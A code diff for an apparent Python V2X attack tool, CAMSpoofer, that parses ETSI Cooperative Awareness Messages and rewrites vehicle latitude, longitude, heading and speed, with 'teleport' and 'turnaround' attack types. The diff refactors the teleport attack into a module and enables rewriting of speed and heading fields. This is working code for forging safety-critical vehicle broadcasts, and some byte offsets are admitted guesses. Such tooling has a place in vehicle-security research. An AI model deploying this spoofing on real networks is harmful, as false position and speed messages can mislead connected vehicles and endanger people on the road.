@@ -1,19 +1,9 @@
-from sniffer import CAMSniffer
-import sys
-import os
-import math
-import random
-
-# Add parent directory to path for imports
-sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
-from app.modules import CoordinatesGenerator
-
+from modules import teleport
 from enum import Enum
 
 class ATTACK_TYPES(Enum):
     TELEPORT = 1
-    OVERSPEED = 2
-    FREEZE = 3
+    TURNAROUND = 2
 
 class CAMSpoofer:
     def __init__(self, mac, payload, attack_type=ATTACK_TYPES.TELEPORT):
@@ -27,51 +17,16 @@ class CAMSpoofer:
          substract 14 from each byte index   """ 
         
     def run(self):
+        print(f"   💀 CAMSpoofer running for station mac {self.mac}")
         self.process_valuies()
-        
-        if self.attack_type == ATTACK_TYPES.TELEPORT:
-            print(f"   📌 Executing Teleport Attack...")
-            self.teleport()
-            
+        self.attack()
+        self.modify_payload()
     
-    # def teleport(self):
-    #     """Teleport coordinates 2km away from current position."""
-    #     # Convert from ETSI format (1/10 microdegrees) to decimal degrees
-    #     lat_degrees = self.lat / 10_000_000.0
-    #     lon_degrees = self.lon / 10_000_000.0
-        
-    #     print(f"      Original position: ({lat_degrees:.6f}, {lon_degrees:.6f})")
-        
-    #     # Generate new position 2km away using spherical geometry
-    #     new_lat, new_lon = CoordinatesGenerator.random_location_within_radius(
-    #         (lat_degrees, lon_degrees), 
-    #         radius_m=2000  # 2km
-    #     )
-        
-    #     print(f"      Spoofed position:  ({new_lat:.6f}, {new_lon:.6f})")
-        
-    #     # Convert back to ETSI format (1/10 microdegrees)
-    #     self.lat = int(new_lat * 10_000_000)
-    #     self.lon = int(new_lon * 10_000_000)
-        
-    #     # Update the payload with new coordinates
-    #     self.modify_payload()
-        
-    #     print(f"   ✅ Teleportation complete: ~{self._calculate_distance(lat_degrees, lon_degrees, new_lat, new_lon):.0f}m away")
-    
-    def _calculate_distance(self, lat1, lon1, lat2, lon2):
-        """Calculate distance between two points using haversine formula."""
-        R = 6371000  # Earth radius in meters
-        phi1 = math.radians(lat1)
-        phi2 = math.radians(lat2)
-        delta_phi = math.radians(lat2 - lat1)
-        delta_lambda = math.radians(lon2 - lon1)
-        
-        a = math.sin(delta_phi/2)**2 + math.cos(phi1) * math.cos(phi2) * math.sin(delta_lambda/2)**2
-        c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
-        
-        return R * c
-        
+    def attack(self):
+       if self.attack_type == ATTACK_TYPES.TELEPORT:
+           print(f"   📌Teleportation attack: falsifieng coordinates: {self.lat} {self.lon}")
+           self.lat, self.lon = teleport.teleport(self.lat, self.lon)
+           
     
     def process_valuies(self):
    
@@ -87,16 +42,31 @@ class CAMSpoofer:
         self.lat = int.from_bytes(lat_payload, byteorder='big', signed=False)
         self.lon = int.from_bytes(lon_payload, byteorder='big', signed=False)
         
+        print(f"      GeoNetworking LPV: lat={self.lat}, lon={self.lon}")
+        
         
         """ Inside Intelligent Transport Systems (Bytes 58-98)
             using ETSI TS 102 894-2 V1.3.1 (ITS Data Dictionary)
             we subtract the following:
+                - latitude / longitude (in CAM Basic Container)
                 - speed
                 - heading   """ 
         
         its_payload = self.payload[58 - 14:]
-        heading_payload = its_payload[84 - 58 : 85 - 58]
-        speed_payload = its_payload[86 - 58 : 87 - 58]
+        
+        # Read CAM Basic Container reference position (trying different offsets)
+        # ETSI EN 302 637-2: Basic Container includes referencePosition
+        # Try offset 9 (common for CAM structure after header)
+        cam_lat_payload = its_payload[9:13]  # 4 bytes
+        cam_lon_payload = its_payload[13:17]  # 4 bytes
+        cam_lat = int.from_bytes(cam_lat_payload, byteorder='big', signed=True)
+        cam_lon = int.from_bytes(cam_lon_payload, byteorder='big', signed=True)
+        
+        print(f"      CAM ITS (offset 9): lat={cam_lat}, lon={cam_lon}")
+        print(f"      Hex at offset 9: {its_payload[9:17].hex()}")
+        
+        heading_payload = its_payload[84 - 58 : 86 - 58]  # 2 bytes for heading
+        speed_payload = its_payload[86 - 58 : 88 - 58]    # 2 bytes for speed
         self.heading = int.from_bytes(heading_payload, byteorder='big', signed=False)
         self.speed = int.from_bytes(speed_payload, byteorder='big', signed=False)
     
@@ -105,6 +75,12 @@ class CAMSpoofer:
         
         lat_bytes = self.lat.to_bytes(4, byteorder='big', signed=False)
         lon_bytes = self.lon.to_bytes(4, byteorder='big', signed=False)
+        
+        lat_bytes_ITS = self.lat.to_bytes(4, byteorder='big', signed=True)
+        lon_bytes_ITS = self.lon.to_bytes(4, byteorder='big', signed=True)
+        
+        
+        # Modify lvp inside GeoNetworking header
         
         # Calculate absolute positions in payload
         lpv_start = 26 - 14
@@ -117,12 +93,22 @@ class CAMSpoofer:
         # Update longitude (4 bytes)
         self.payload[lon_start:lon_start+4] = lon_bytes
         
-        # If heading and speed need updating (uncomment if needed)
-        # heading_bytes = self.heading.to_bytes(2, byteorder='big', signed=False)
-        # speed_bytes = self.speed.to_bytes(2, byteorder='big', signed=False)
-        # its_start = 58 - 14
-        # self.payload[its_start + (84-58):its_start + (84-58) + 2] = heading_bytes
-        # self.payload[its_start + (86-58):its_start + (86-58) + 2] = speed_bytes
+        # Modify lat, lon, speed, heading inside ITS header
+        
+        heading_bytes = self.heading.to_bytes(2, byteorder='big', signed=False)
+        speed_bytes = self.speed.to_bytes(2, byteorder='big', signed=False)
+        its_start = 58 - 14
+        self.payload[its_start + (84-58):its_start + (84-58) + 2] = heading_bytes
+        self.payload[its_start + (86-58):its_start + (86-58) + 2] = speed_bytes
+        
+        # Update CAM Basic Container reference position (offset 9 in ITS payload)
+        # Frame bytes: 58 (ITS start) + 9 = 67 for lat, 71 for lon
+        # self.payload[its_start + 9:its_start + 13] = lat_bytes_ITS   # 4 bytes lat
+        # self.payload[its_start + 13:its_start + 17] = lon_bytes_ITS  # 4 bytes lon
+        
+        # We do not update lat, lon inside ITS header as it supposetly is UPER encoded
+        
+         
         
     def get_modified_payload(self):
         return self.payload
